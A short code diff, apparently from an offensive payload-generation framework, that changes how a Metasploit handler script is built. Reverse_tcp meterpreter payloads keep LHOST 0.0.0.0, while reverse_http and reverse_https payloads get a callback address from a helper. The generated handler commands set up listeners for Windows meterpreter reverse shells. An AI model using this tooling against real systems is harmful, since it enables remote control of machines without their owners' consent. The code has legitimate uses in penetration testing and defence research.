@@ -490,15 +490,19 @@ class Controller:
                 else:
                     # extract the payload class name from the instantiated object, then chop off the load folder prefix
                     payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
+                    
+                    lhost = helpers.LHOST()
+
                     if "tcp" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
+                        handler += "set LHOST 0.0.0.0\n"
                     elif "https" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
+                        handler += "set LHOST " + lhost + "\n"
                     elif "http" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_http\n"
+                        handler += "set LHOST " + lhost + "\n"
                     else: pass
-
-                handler += "set LHOST 0.0.0.0\n"
 
                 if "LPORT" in keys:
                     handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"
